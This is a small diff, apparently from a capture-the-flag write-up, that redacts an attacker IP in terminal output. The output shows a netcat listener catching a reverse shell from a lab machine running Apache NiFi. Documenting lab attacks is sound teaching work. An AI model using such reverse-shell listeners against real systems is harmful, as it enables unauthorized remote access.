@@ -81,7 +81,7 @@ Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
 ┌──(root㉿kali-linux-2024-2)-[/home/parallels/Documents/Helix]
 └─# nc -lvnp 5555           
 listening on [any] 5555 ...
-connect to [10.10.16.65] from (UNKNOWN) [10.129.2.106] 57412
+connect to [<attacker_ip>] from (UNKNOWN) [10.129.2.106] 57412
 bash: cannot set terminal process group (966): Inappropriate ioctl for device
 bash: no job control in this shell
 nifi@helix:/opt/nifi-1.21.0$ 
